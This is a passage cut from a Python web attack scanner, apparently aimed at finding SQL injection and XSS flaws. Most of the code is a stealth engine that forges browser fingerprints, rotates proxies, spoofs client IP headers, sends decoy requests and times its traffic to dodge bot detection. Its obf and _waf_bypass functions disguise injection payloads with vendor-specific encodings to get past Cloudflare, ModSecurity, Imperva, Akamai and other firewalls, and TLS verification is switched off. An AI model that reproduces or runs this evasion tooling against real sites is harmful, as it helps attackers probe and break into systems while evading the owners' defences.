            "en-US,en;q=0.9,de;q=0.7,es;q=0.5","en-US,en;q=0.8",
            "en-US,en;q=0.9,ja;q=0.7","en-US,en;q=0.9,zh-CN;q=0.6",
            "en-US,en;q=0.9,pt;q=0.7","en-US,en;q=0.9,ko;q=0.6",
            "en-US,en;q=0.9,ru;q=0.5","en-US,en;q=0.9,it;q=0.6",
            "en-US,en;q=0.9,nl;q=0.5","en-US,en;q=0.9,tr;q=0.5",
        ]
        self._accept_encs=[
            "gzip, deflate, br","gzip, deflate","br, gzip, deflate",
            "gzip, deflate, br;q=0.9","deflate, gzip;q=0.8, *;q=0.5",
            "gzip, deflate, br;q=1.0, *;q=0.5",
        ]
        self._connections=["keep-alive","Keep-Alive","close"]
        self._cache_controls=["max-age=0","no-cache","max-age=0, no-cache",
                              "max-stale=0","no-store","no-cache, no-store"]
        self._sec_ch_ua=[
            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not:A-Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
            '"Chromium";v="120", "Not(A:Brand";v="24"',
            '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            '"Not_A Brand";v="8", "Chromium";v="121", "Google Chrome";v="121"',
            '"Chromium";v="122", "Not(A:Brand";v="24"',
            '"Google Chrome";v="122", "Chromium";v="122", "Not;A=Brand";v="99"',
        ]
        self._sec_ch_ua_mobile=["?0","?0","?0","?1","?0"]
        self._viewport_widths=["1920","1366","1536","1440","1280","2560","1680","360","390","414"]
        self._viewport_heights=["1080","768","864","900","720","1440","1050","640","844","896"]
        self._color_depths=["24","30","32"]
        self._platforms_map={
            "chrome_win":'"Windows"',"chrome_mac":'"macOS"',
            "chrome_linux":'"Linux"',"firefox_win":'"Windows"',
            "firefox_mac":'"macOS"',"firefox_linux":'"Linux"',
            "safari_mac":'"macOS"',"edge_win":'"Windows"',
        }
        self._header_order={
            "chrome":["Host","Connection","sec-ch-ua","sec-ch-ua-mobile",
                      "sec-ch-ua-platform","Upgrade-Insecure-Requests","User-Agent",
                      "Accept","Sec-Fetch-Site","Sec-Fetch-Mode","Sec-Fetch-User",
                      "Sec-Fetch-Dest","Accept-Encoding","Accept-Language","Cookie"],
            "firefox":["Host","User-Agent","Accept","Accept-Language",
                       "Accept-Encoding","Connection","Sec-Fetch-Dest",
                       "Sec-Fetch-Mode","Sec-Fetch-Site","Sec-Fetch-User","Cookie"],
            "safari":["Host","Accept","User-Agent","Accept-Language",
                      "Accept-Encoding","Connection","Cookie"],
            "edge":["Host","Connection","sec-ch-ua","sec-ch-ua-mobile",
                    "sec-ch-ua-platform","Upgrade-Insecure-Requests","User-Agent",
                    "Accept","Sec-Fetch-Site","Sec-Fetch-Mode","Sec-Fetch-User",
                    "Sec-Fetch-Dest","Accept-Encoding","Accept-Language","Cookie"],
        }

    def delay(self):
        if self.no_delay: return
        base=random.uniform(self._adaptive_delay_min,self._adaptive_delay_max)
        jitter=random.gauss(0,base*0.3)
        t=max(0.05,base+jitter)
        if self.captcha_detected:
            t+=random.uniform(10.0,30.0)
        if self.was_blocked:
            t+=random.uniform(5.0,15.0)
        if self.req_count>0 and self.req_count%5==0:
            t+=random.uniform(2.0,5.0)
        if self.req_count>0 and self.req_count%12==0:
            t+=random.uniform(5.0,12.0)
        if self.req_count>0 and self.req_count%20==0:
            t+=random.uniform(8.0,20.0)
        if self.last_length>0:
            read_time=self.last_length/self._human_read_speed
            t=max(t,read_time*0.3)
        if random.random()>0.85:
            t+=random.uniform(3.0,8.0)
        if random.random()>0.95:
            t+=random.uniform(15.0,45.0)
        if self._pages_read>0 and self._pages_read%4==0:
            t+=random.uniform(10.0,25.0)
        self._pages_read+=1
        time.sleep(t)

    def adapt(self,resp):
        if not resp: return
        self.last_status=resp.get("s",0)
        self.last_length=resp.get("l",0)
        ct=resp.get("c","").lower()
        hs=resp.get("h",{})
        status=resp.get("s",200)
        if status in [403,429,503]:
            self.blocked_count+=1
            self.was_blocked=True
            self._adaptive_delay_min=min(self._adaptive_delay_min*1.5,5.0)
            self._adaptive_delay_max=min(self._adaptive_delay_max*1.5,15.0)
            self._consecutive_errors+=1
            self._engagement_score=max(0.1,self._engagement_score*0.5)
        else:
            self.was_blocked=False
            if self._consecutive_errors>0: self._consecutive_errors-=1
            if self._adaptive_delay_min>self.mind:
                self._adaptive_delay_min=max(self._adaptive_delay_min*0.8,self.mind)
            if self._adaptive_delay_max>self.maxd:
                self._adaptive_delay_max=max(self._adaptive_delay_max*0.8,self.maxd)
            self._engagement_score=min(2.0,self._engagement_score*1.05)
        captcha_sigs=["captcha","recaptcha","hcaptcha","turnstile","cf-turnstile",
                      "g-recaptcha","h-captcha","cf-challenge","challenge-platform",
                      "px-captcha","kasada","akamai-bot","datadome","shape security",
                      "perimeterx","arcesiun","silverline"]
        for sig in captcha_sigs:
            if sig in ct or sig in str(hs).lower():
                self.captcha_detected=True; break
        bot_sigs=["blocked","denied","rate limit","too many","abuse","bot detect",
                  "automated","scraper","spider","crawler","security check",
                  "please verify","are you human","not a robot","prove you"]
        for sig in bot_sigs:
            if sig in ct:
                self._engagement_score=max(0.1,self._engagement_score*0.7); break
        waf_sigs=[(r"cloudflare","Cloudflare"),(r"akamai","Akamai"),
                  (r"incapsula","Incapsula"),(r"sucuri","Sucuri"),
                  (r"mod_security","ModSecurity"),(r"imperva","Imperva"),
                  (r"barracuda","Barracuda"),(r"f5","F5"),
                  (r"fortiweb","FortiWeb"),(r"citrix","Citrix"),
                  (r"aws.waf","AWS WAF"),(r"azure.front.door","Azure WAF"),
                  (r"cloudfront","CloudFront"),(r"datadome","DataDome"),
                  (r"shape","Shape Security"),(r"perimeterx","PerimeterX"),
                  (r"fastly","Fastly WAF"),(r"wordfence","Wordfence")]
        body=ct+str(hs)
        for pat,name in waf_sigs:
            if re.search(pat,body,re.IGNORECASE):
                self.waf_name=name; break

    def next_proxy(self):
        if self.proxies:
            p=self.proxies[self.proxy_idx%len(self.proxies)]
            self.proxy_idx+=1
            return p
        return self.proxy

    def rotate_fingerprint(self):
        old=self.fingerprint
        choices=["chrome_win","chrome_mac","chrome_linux",
                 "firefox_win","firefox_mac","firefox_linux",
                 "safari_mac","edge_win"]
        choices=[c for c in choices if c!=old]
        self.fingerprint=random.choice(choices)

    def update_session(self,resp):
        if resp and "h" in resp:
            sc=resp["h"].get("Set-Cookie","")
            if sc:
                for part in sc.split(","):
                    part=part.strip()
                    if "=" in part:
                        k=part.split("=")[0].strip()
                        v=part.split("=",1)[1].split(";")[0].strip()
                        if "httponly" not in k.lower() and "path" not in k.lower():
                            self.session_cookies[k]=v
            for h in ["x-csrf-token","x-xsrf-token","csrf-token","_token",
                      "x-request-id","x-correlation-id","etag"]:
                v=resp["h"].get(h,"")
                if v: self.session_cookies[h]=v

    def build_referer(self,url):
        ps=urlparse(url)
        domain=ps.netloc
        if self.referer_chain and random.random()>0.3:
            ref=self.referer_chain[-1]
            self.referer_chain.append(url)
            return ref
        paths=["/","/home","/search","/categories","/products",
               "/about","/contact","/blog","/faq","/login","/signup"]
        search_engines=[
            ("https://www.google.com/search?q=",["&btnK=Google+Search","&source=hp","&sxsrf="]),
            ("https://www.bing.com/search?q=",["&form=QBLH","&sp=-1"]),
            ("https://duckduckgo.com/?q=",["&ia=web"]),
            ("https://search.yahoo.com/search?p=",["&fr=yfp-t"]),
            ("https://yandex.com/search/?text=",["&lr="]),
        ]
        social=[
            (f"https://www.facebook.com/sharer.php?u={ps.scheme}://{domain}","fb"),
            (f"https://www.twitter.com/{domain}","twitter"),
            ("https://www.linkedin.com/feed/","linkedin"),
            ("https://www.reddit.com/r/all/comments/","reddit"),
        ]
        if random.random()>0.4:
            se,extra=random.choice(search_engines)
            ref=se+urllib.parse.quote(random.choice(paths))+random.choice(extra)
        elif random.random()>0.5:
            ref,_=random.choice(social)
        elif self.visited_paths:
            ref=f"{ps.scheme}://{domain}{random.choice(self.visited_paths)}"
        else:
            ref=f"{ps.scheme}://{domain}/"
        self.referer_chain.append(url)
        if len(self.referer_chain)>20:
            self.referer_chain=self.referer_chain[-10:]
        return ref

    def browser_headers(self,url=None):
        fp=self.fingerprint
        h={}
        if "chrome" in fp or "edge" in fp:
            h["sec-ch-ua"]=random.choice(self._sec_ch_ua)
            h["sec-ch-ua-mobile"]=random.choice(self._sec_ch_ua_mobile)
            h["sec-ch-ua-platform"]=self._platforms_map.get(fp,'"Windows"')
            h["Upgrade-Insecure-Requests"]="1"
            h["Sec-Fetch-Dest"]="document"
            h["Sec-Fetch-Mode"]="navigate"
            h["Sec-Fetch-Site"]="none" if self.req_count==0 else random.choice(
                ["same-origin","none","same-site","same-origin","same-origin"])
            h["Sec-Fetch-User"]="?1"
            if "edge" in fp:
                h["sec-ch-ua"]=random.choice([
                    '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                    '"Not:A-Brand";v="99", "Chromium";v="122", "Microsoft Edge";v="122"',
                ])
        elif "firefox" in fp:
            h["Sec-Fetch-Dest"]="document"
            h["Sec-Fetch-Mode"]="navigate"
            h["Sec-Fetch-Site"]="none" if self.req_count==0 else random.choice(
                ["same-origin","none","same-site","same-origin"])
            h["Sec-Fetch-User"]="?1"
            h["TE"]="trailers"
        elif "safari" in fp:
            h["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            h["Upgrade-Insecure-Requests"]="1"
        h["Accept-Language"]=random.choice(self._accept_langs)
        h["Accept-Encoding"]=random.choice(self._accept_encs)
        h["Connection"]=random.choice(self._connections)
        h["Cache-Control"]=random.choice(self._cache_controls)
        h["DNT"]=random.choice(["1","0","1"])
        if random.random()>0.7:
            h["Viewport-Width"]=random.choice(self._viewport_widths)
            h["Device-Memory"]=random.choice(["2","4","8","16"])
            h["Downlink"]=random.choice(["1.4","2.6","5.6","10"])
            h["ECT"]=random.choice(["4g","3g"])
            h["RTT"]=random.choice(["0","50","100"])
        if random.random()>0.8:
            h["Sec-GPC"]="1"
        if random.random()>0.6:
            h["Purpose"]="prefetch" if self.req_count%3==0 else "preflight"
        if random.random()>0.9:
            h["Save-Data"]="on"
        return h

    def pre_browse(self,url):
        parsed=urlparse(url)
        base=f"{parsed.scheme}://{parsed.netloc}"
        homepage=req(base,stealth=False,to=5)
        if homepage and not homepage.get("e"):
            self.update_session(homepage)
            self.visited_paths.append("/")
            links=re.findall(r'href=["\'](/[^"\']+)["\']',homepage["c"])
            self.visited_paths.extend(links[:5])
        paths=["/robots.txt","/sitemap.xml","/favicon.ico",
               "/.well-known/security.txt","/humans.txt",
               "/apple-touch-icon.png","/browserconfig.xml",
               "/manifest.json","/assets/","/static/","/css/","/js/"]
        for p in random.sample(paths,random.randint(2,4)):
            try:
                r=req(base+p,stealth=False,to=3)
                if r and not r.get("e"):
                    self.update_session(r)
                    self.visited_paths.append(p)
            except: pass

    def decoy(self,url):
        parsed=urlparse(url)
        base=f"{parsed.scheme}://{parsed.netloc}"
        paths=["/robots.txt","/sitemap.xml","/favicon.ico",
               "/.well-known/security.txt","/humans.txt",
               "/apple-touch-icon.png","/browserconfig.xml",
               "/manifest.json","/service-worker.js",
               "/sitemap_index.xml","/rss","/feed","/atom.xml",
               "/wp-json/","/graphql","/swagger.json","/openapi.json"]
        for p in random.sample(paths,random.randint(1,3)):
            try: req(base+p,stealth=False,to=3)
            except: pass

    def obf(self,p):
        r=p
        if not self.waf_name:
            return p
        if self.waf_name:
            r=self._waf_bypass(r,self.waf_name)
        for kw in ["OR","AND","UNION","SELECT","FROM","WHERE","SLEEP","IF",
                    "WAITFOR","BENCHMARK","CONCAT","SUBSTRING","ASCII","LENGTH",
                    "ORDER","GROUP","HAVING","NULL","script","alert","onerror",
                    "onload","svg","img","body","iframe","javascript","document",
                    "cookie","eval","fetch","location","EXEC","xp_cmdshell",
                    "information_schema","table_name","column_name","version",
                    "database","user","load_file","INTO","OUTFILE","DUMPFILE",
                    "LOAD","DATA","INFILE","CHAR","CHR","MID","LEFT","RIGHT",
                    "UPPER","LOWER","REVERSE","REPLACE","INSERT","UPDATE",
                    "DELETE","DROP","CREATE","ALTER","GRANT","REVOKE"]:
            if re.search(re.escape(kw),r,re.IGNORECASE):
                vs=[kw.lower(),kw.capitalize(),kw.upper(),
                    "".join(c.upper() if random.random()>0.5 else c.lower() for c in kw)]
                r=re.sub(re.escape(kw),random.choice(vs),r,flags=re.IGNORECASE)
        cs=["/**/","/*%20*/","/**//**/","/*!*/","/*!50000*/","/*!40000*/",
            "/*!30000*/","%00","%09","%0b","%0c","%0d%0a","%23","%2d%2d",
            "--%0a","--%0d","%3c!--","/*+*/","%26%26"]
        r=re.sub(r'\s+',lambda m:random.choice(cs),r)
        ws=random.choice(["tab","nl","cr","ff","vt","norm","mixed"])
        if ws=="tab": r=r.replace(" ","%09")
        elif ws=="nl": r=r.replace(" ","%0A")
        elif ws=="cr": r=r.replace(" ","%0D")
        elif ws=="ff": r=r.replace(" ","%0C")
        elif ws=="vt": r=r.replace(" ","%0B")
        elif ws=="mixed":
            r=r.replace(" ",random.choice(["%09","%0A","%0D","%0C","%0B","/**/","%20"]),1)
        if random.random()>0.7: r=r.replace("'","%00'")
        if random.random()>0.8: r=r.replace("'","'%00")
        if random.random()>0.85: r=r.replace(" ","%00 ")
        enc=random.choice(["single","double","triple","none"])
        if enc=="single": r=urllib.parse.quote(r,safe="")
        elif enc=="double": r=urllib.parse.quote(urllib.parse.quote(r,safe=""),safe="")
        elif enc=="triple": r=urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(r,safe=""),safe=""),safe="")
        if random.random()>0.8:
            r=r.replace("<","\\u003c").replace(">","\\u003e")
            r=r.replace("'","\\u0027").replace('"',"\\u0022")
        if random.random()>0.85: r=r.replace("'","%C0%A7")
        if random.random()>0.85: r=r.replace("'","%E0%80%A7")
        if random.random()>0.85: r=r.replace("'","%EF%BC%87")
        if random.random()>0.9: r=r.replace("'","&#39;").replace("<","&lt;").replace(">","&gt;")
        if random.random()>0.9: r=r.replace("'","&#x27;").replace("<","&#x3c;").replace(">","&#x3e;")
        if random.random()>0.85: r=r.replace("'","0x27")
        if random.random()>0.8 and "CONCAT" in r and "CONCAT_WS" not in r:
            r=r.replace("CONCAT","CONCAT_WS(0x7e,",1)
        if random.random()>0.9: r=r.replace("'","CHAR(39)")
        if random.random()>0.85: r=r.replace(" ","%20%20")
        if random.random()>0.7:
            for ch in "aeiou":
                if random.random()>0.6 and "{{" not in r:
                    r=r.replace(ch,"{{"+ch+"}}",1)
        if random.random()>0.9: r=r.replace("'","%2527")
        if random.random()>0.9: r=r.replace(" ","%2520")
        if random.random()>0.85:
            r=r.replace("OR","O%52").replace("AND","A%4eD")
        return r

    def _waf_bypass(self,p,waf):
        r=p
        w=waf.lower()
        if "cloudflare" in w:
            r=re.sub(r"(?i)union\s+select","UNI/**/ON SEL/**/ECT",r)
            r=re.sub(r"(?i)or\s+1=1","%4fR 1%3D1",r)
            r=re.sub(r"(?i)sleep","SLE%45EP",r)
            r=re.sub(r"(?i)concat","CON%43AT",r)
            r=re.sub(r"(?i)<script","<ScRiPt",r)
            r=re.sub(r"(?i)alert","%61lert",r)
        elif "modsecurity" in w:
            r=re.sub(r"(?i)select","/*!50000SELECT*/",r)
            r=re.sub(r"(?i)union","/*!50000UNION*/",r)
            r=re.sub(r"(?i)from","/*!50000FROM*/",r)
            r=re.sub(r"(?i)where","/*!50000WHERE*/",r)
            r=re.sub(r"(?i)or ","/*!50000OR*/ ",r)
        elif "imperva" in w or "incapsula" in w:
            r=re.sub(r"(?i)alert","%2561lert",r)
            r=re.sub(r"(?i)script","%2573cript",r)
            r=re.sub(r"(?i)<","%253c",r)
            r=re.sub(r"(?i)>","%253e",r)
            r=re.sub(r"(?i)onerror","%256fnerror",r)
        elif "akamai" in w:
            r=re.sub(r"(?i)or\s+","O%52 ",r)
            r=re.sub(r"(?i)and\s+","A%4eD ",r)
            r=re.sub(r"(?i)= ","%3d ",r)
            r=re.sub(r"(?i)union","%55NION",r)
        elif "f5" in w or "barracuda" in w:
            r=r.replace("'","%27%00")
            r=re.sub(r"(?i)union","Uni%6fn",r)
            r=re.sub(r"(?i)select","Sel%65ct",r)
        elif "sucuri" in w:
            r=re.sub(r"(?i)<script","<scr%69pt",r)
            r=re.sub(r"(?i)onerror","on%65rror",r)
            r=re.sub(r"(?i)onload","on%6foad",r)
        elif "wordfence" in w:
            r=re.sub(r"(?i)select","SeLeCt",r)
            r=re.sub(r"(?i)union","UnIoN",r)
            r=re.sub(r"(?i)concat","CoNcAt",r)
        elif "datadome" in w:
            r=re.sub(r"(?i)<","%E2%80%B9",r)
            r=re.sub(r"(?i)>","%E2%80%BA",r)
        elif "perimeterx" in w or "shape" in w:
            r=re.sub(r"(?i)script","%73%63%72%69%70%74",r)
            r=re.sub(r"(?i)alert","%61%6c%65%72%74",r)
            r=re.sub(r"(?i)onerror","%6f%6e%65%72%72%6f%72",r)
        return r

    def rand_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def rand_ipv6(self):
        return ":".join("%x"%random.randint(0,0xffff) for _ in range(8))

    def ip_headers(self):
        ip=self.rand_ip()
        hdrs={
            "X-Forwarded-For":ip,
            "X-Real-IP":ip,
            "X-Client-IP":self.rand_ip(),
            "X-Originating-IP":self.rand_ip(),
            "X-Remote-IP":self.rand_ip(),
            "X-Remote-Addr":self.rand_ip(),
            "Forwarded":f"for={ip};by={self.rand_ip()}",
            "Via":f"1.1 {random.choice(['proxy','cache','gateway','squid','nginx','haproxy','varnish','cdn','www','web'])}",
        }
        if random.random()>0.7:
            hdrs["X-Forwarded-For"]=f"{ip}, {self.rand_ip()}, {self.rand_ip()}"
        if random.random()>0.8:
            hdrs["X-Forwarded-Host"]=random.choice([self.rand_ip(),"localhost","127.0.0.1"])
        if random.random()>0.85:
            hdrs["X-Azure-ClientIP"]=self.rand_ip()
            hdrs["X-Azure-Ref"]=base64.b64encode(os.urandom(16)).decode()[:20]
        if random.random()>0.9:
            hdrs["X-Forwarded-Proto"]=random.choice(["https","http"])
            hdrs["X-Forwarded-Port"]=random.choice(["443","80","8443"])
        return hdrs

    def all_cookies(self):
        c=dict(self.cookies)
        c.update(self.session_cookies)
        return c

    def get_ua(self):
        fp=self.fingerprint
        if "chrome" in fp:
            ver=random.randint(120,128)
            plats={"win":"Windows NT 10.0; Win64; x64","mac":"Macintosh; Intel Mac OS X 10_15_7",
                   "linux":"X11; Linux x86_64"}
            p=plats.get(fp.split("_")[1],"Windows NT 10.0; Win64; x64")
            return f"Mozilla/5.0 ({p}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{random.randint(5000,6500)}.{random.randint(50,200)} Safari/537.36"
        elif "firefox" in fp:
            ver=random.randint(120,130)
            plats={"win":"Windows NT 10.0; Win64; x64","mac":"Macintosh; Intel Mac OS X 14.0; rv:"+str(ver)+".0",
                   "linux":"X11; Linux x86_64; rv:"+str(ver)+".0"}
            p=plats.get(fp.split("_")[1],f"Windows NT 10.0; Win64; x64; rv:{ver}.0")
            return f"Mozilla/5.0 ({p}; rv:{ver}.0) Gecko/20100101 Firefox/{ver}.0"
        elif "safari" in fp:
            bver=random.randint(610,620)
            return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_{random.randint(0,5)}) AppleWebKit/{bver}.{random.randint(1,15)}.{random.randint(1,20)} (KHTML, like Gecko) Version/17.{random.randint(2,5)} Safari/{bver}.{random.randint(1,15)}"
        elif "edge" in fp:
            ver=random.randint(120,128)
            return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{random.randint(5000,6500)}.{random.randint(50,200)} Safari/537.36 Edg/{ver}.0.{random.randint(1000,2000)}.{random.randint(10,100)}"
        return random.choice(USER_AGENTS)

    def get_accept(self):
        if random.random()>0.7:
            return random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            ])
        return "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"

    def _tls_fp(self):
        fp=self.fingerprint.split("_")[0]
        ciphers=self._tls_ciphers.get(fp,self._tls_ciphers["chrome"])
        return random.choice(ciphers),random.choice(self._alpn),random.choice(self._http_versions),random.choice(self._tls_versions)

    def isp_ip(self):
        name,ranges=random.choice(self._isp_ips)
        a,b=random.choice(ranges)
        cls_a=random.randint(a,b)
        cls_b=random.randint(0,255)
        cls_c=random.randint(0,255)
        cls_d=random.randint(1,254)
        return name,f"{cls_a}.{cls_b}.{cls_c}.{cls_d}"

    def url_padding(self,url):
        padded=url
        if "?" in url and random.random()>0.4:
            kinds=random.choice(["real","tracking","cache","mixed"])
            ps=urlparse(url)
            pq=parse_qs(ps.query)
            if kinds=="real":
                pq[random.choice(self._xss_padding)]=[random.choice(["1","true","en","0","no"])]
            elif kinds=="tracking":
                pq["utm_campaign"]=[random.choice(["organic","social","ppc","email"])]
                pq["utm_medium"]=[random.choice(["cpc","social","email","display"])]
            elif kinds=="cache":
                pq[random.choice(["_","rnd","nocache","ts"])]=[str(random.randint(1000,99999))]
            elif kinds=="mixed":
                pq[random.choice(self._xss_padding)]=[str(random.randint(1000,99999))]
            padded=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(pq,doseq=True)}"
        return padded

    def accept_ch(self):
        return {"Sec-CH-UA":random.choice(self._sec_ch_ua) if random.random()>0.7 else "",
                "Sec-CH-UA-Mobile":"?0",
                "Sec-CH-UA-Platform":self._platforms_map.get(self.fingerprint,'"Windows"'),
                "Sec-CH-UA-Full-Version-List":'"Not/A)Brand";v="99.0.0.0", "Chromium";v="120.0.6099.109"',
                "Sec-CH-UA-Arch":"x86" if "win" in self.fingerprint else "arm",
                "Sec-CH-UA-Model":random.choice(["","","ASUS Z01KDA","Pixel 7","SM-G960U","iPhone14,2"])}

    def resource_hints(self):
        if random.random()>0.8:
            return {"Link":"<https://connect.example.test>; rel=preconnect,</assets/main.js>; rel=preload; as=script"}
        return {}

    def etag_cache(self,resp):
        if resp and "h" in resp:
            etag=resp["h"].get("ETag","") or resp["h"].get("Last-Modified","")
            if etag:
                self.session_cookies["etag"]=etag.replace('"',"")
                if random.random()>0.5:
                    self.hdrs["If-None-Match"]=etag
                else:
                    self.hdrs["If-Modified-Since"]=resp["h"].get("Last-Modified","")

    def rotation_headers(self,url):
        ps=urlparse(url)
        head={"Host":ps.netloc}
        cipher,alpn,http_version,tls_version=self._tls_fp()
        if random.random()>0.6:
            head["X-TLS-Cipher"]="<<simulated>>"
            head["X-TLS-Version"]=tls_version
            head["X-HTTP-Version"]=http_version
        isp_name,isp_ip=self.isp_ip()
        if random.random()>0.4:
            head["True-Client-IP"]=isp_ip
            head["X-ISP"]=isp_name
        if random.random()>0.6:
            head["X-Requested-With"]=random.choice(["XMLHttpRequest","Fetch",""] if random.random()>0.5 else ["XMLHttpRequest",""])
        if random.random()>0.8:
            head["Content-DPR"]=random.choice(["2","2.5","3"])
        h2_pseudo={"Authority":ps.netloc,"Path":ps.path or "/","Scheme":ps.scheme}
        if random.random()>0.9:
            head["X-H2-Pseudo-Order"]=":method,:path,:scheme,:authority,:status"
        return head,h2_pseudo

st=Stealth()

def clr():
    if IS_WIN: os.system("cls")
    else: os.system("clear")

def plat_info():
    s = platform.system()
    r = platform.release()
    m = platform.machine()
    pv = platform.python_version()
    dist = ""
    if IS_KALI: dist = "Kali Linux"
    elif IS_ARCH: dist = "Arch Linux"
    elif IS_TERMUX: dist = "Termux/Android"
    elif IS_LINUX:
        try:
            with open("/etc/os-release") as f:
                for l in f:
                    if l.startswith("PRETTY_NAME="):
                        dist = l.split("=")[1].strip().strip('"'); break
        except: pass
    parts = [f"{s} {r}", m, f"Python {pv}"]
    if dist: parts.insert(0, dist)
    return " | ".join(parts)

def rua(): return random.choice(USER_AGENTS)
def rref(): return random.choice(REFERERS)

def banner():
    clr()
    print(BANNER)
    print(f"{C.D}  Platform: {plat_info()}{C.X}")
    print(f"{C.D}  {'─' * 60}{C.X}\n")

def ok(m): print(f"{C.G}[+]{C.X} {m}")
def err(m): print(f"{C.R}[-]{C.X} {m}")
def inf(m): print(f"{C.CY}[*]{C.X} {m}")
def wrn(m): print(f"{C.Y}[!]{C.X} {m}")
def vln(m): print(f"{C.R}[VULN]{C.X} {m}")

def vlen(s):
    return len(ANSI_PAT.sub("", s))

def vpad(s, width):
    return s + " " * max(0, width - vlen(s))

def box(lines, title=None):
    inner = max(vlen(line) for line in lines)
    if title is not None:
        inner = max(inner, vlen(title))
    top = f"{C.BO}╔{'═' * (inner + 2)}╗{C.X}"
    mid = f"{C.BO}╠{'═' * (inner + 2)}╣{C.X}"
    bot = f"{C.BO}╚{'═' * (inner + 2)}╝{C.X}"
    out = [top]
    if title is not None:
        out.append(f"{C.BO}║ {vpad(title, inner)} ║{C.X}")
        out.append(mid)
    out.extend(f"{C.BO}║ {vpad(line, inner)} ║{C.X}" for line in lines)
    out.append(bot)
    return "\n".join(out)

def req(url,method="GET",data=None,hdrs=None,to=TO,stealth=True):
    if stealth:
        st.delay()
    st.req_count+=1
    t0=time.time()
    try:
        if hdrs is None: hdrs={}
        if stealth:
            hdrs["User-Agent"]=st.get_ua()
            hdrs["Referer"]=st.build_referer(url)
            hdrs["Accept"]=st.get_accept()
            bh=st.browser_headers(url)
            for k,v in bh.items():
                if k not in hdrs: hdrs[k]=v
            rh,h2p=st.rotation_headers(url)
            for k,v in rh.items():
                if k not in hdrs and v: hdrs[k]=v
            for k,v in st.accept_ch().items():
                if v and k not in hdrs: hdrs[k]=v
            for k,v in st.resource_hints().items():
                if v and k not in hdrs: hdrs[k]=v
            if st.req_count%3==0:
                for k,v in st.ip_headers().items():
                    if k not in hdrs: hdrs[k]=v
            if st.req_count%7==0:
                st.decoy(url)
            if st.was_blocked and st.req_count%3==0:
                st.rotate_fingerprint()
                hdrs["User-Agent"]=st.get_ua()
                bh2=st.browser_headers(url)
                for k,v in bh2.items(): hdrs[k]=v
        for k,v in STD_HEADERS.items():
            if k not in hdrs: hdrs[k]=v
        if not stealth:
            hdrs["User-Agent"]=st.get_ua()
        hdrs["Pragma"]="no-cache"
        for k,v in st.hdrs.items(): hdrs[k]=v
        ck=st.all_cookies()
        if ck: hdrs["Cookie"]="; ".join(f"{k}={v}" for k,v in ck.items())
        if data:
            if isinstance(data,dict): data=urllib.parse.urlencode(data).encode()
            elif isinstance(data,str): data=data.encode()
        rq=urllib.request.Request(url,data=data,headers=hdrs,method=method)
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        prx=st.next_proxy() if st.proxies else st.proxy
        if prx:
            op=urllib.request.build_opener(urllib.request.ProxyHandler({"http":prx,"https":prx}),urllib.request.HTTPSHandler(context=ctx))
        else:
            op=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        rs=op.open(rq,timeout=to)
        el=time.time()-t0
        ct=rs.read().decode("utf-8",errors="ignore")
        resp={"s":rs.status,"h":dict(rs.headers),"c":ct,"l":len(ct),"t":el,"u":rs.url,"e":None}
        st.update_session(resp)
        st.etag_cache(resp)
        st.adapt(resp)
        return resp
    except urllib.error.HTTPError as e:
        el=time.time()-t0
        try: ct=e.read().decode("utf-8",errors="ignore")
        except: ct=""
        resp={"s":e.code,"h":dict(e.headers),"c":ct,"l":len(ct),"t":el,"u":url,"e":None}
        st.adapt(resp)
        return resp
    except urllib.error.URLError as e:
        return{"s":0,"h":{},"c":"","l":0,"t":0,"u":url,"e":str(e.reason)}
    except Exception as e:
        return{"s":0,"h":{},"c":"","l":0,"t":0,"u":url,"e":str(e)}

def det_err(ct):
    f=[]
    for p,d in ERR_PAT:
        if re.search(p,ct,re.IGNORECASE):
            conf="high"
            if d == "Generic SQL": conf="medium"
            elif d.startswith("Generic") or "Possible" in d: conf="low"
            f.append({"p":p,"d":d,"conf":conf})
    if not f: return f
    if all(x["conf"]=="low" for x in f):
        return [x for x in f if x["conf"]=="high"] or f
    return [x for x in f if x["conf"]!="low"] or f

def det_xss(ct,pl):
    f=[]
    for p,x in XSS_PAT:
        if re.search(p,ct,re.IGNORECASE):
            m=re.search(p,ct,re.IGNORECASE)
            if "event" in x.lower() and "event handler" in x.lower():
                if re.search(r'<\w+[^>]*'+re.escape(m.group(0)),ct,re.IGNORECASE):
                    f.append({"p":p,"x":x})
                continue
            f.append({"p":p,"x":x})
    pc=re.sub(r'[<>"\'=;/\\]','',pl)
    if pc and len(pc)>3 and re.search(re.escape(pc[:15]),ct,re.IGNORECASE):
        if not f: f.append({"p":"reflected","x":"Payload Reflected"})
    return f

def det_waf(ct,h,s):
    ws=[(r"cloudflare","Cloudflare"),(r"akamai","Akamai"),(r"incapsula","Incapsula"),(r"sucuri","Sucuri"),(r"mod_security","ModSecurity"),(r"webknight","WebKnight"),(r"f5.big.ip","F5 BIG-IP"),(r"barracuda","Barracuda"),(r"citrix","Citrix NetScaler"),(r"fortiweb","FortiWeb"),(r"imperva","Imperva"),(r"request.*blocked","Generic WAF"),(r"not.acceptable","Generic WAF"),(r"forbidden","Possible WAF"),(r"403.*forbidden","Possible WAF"),(r"access.denied","Generic WAF")]
    fl=ct+str(h)
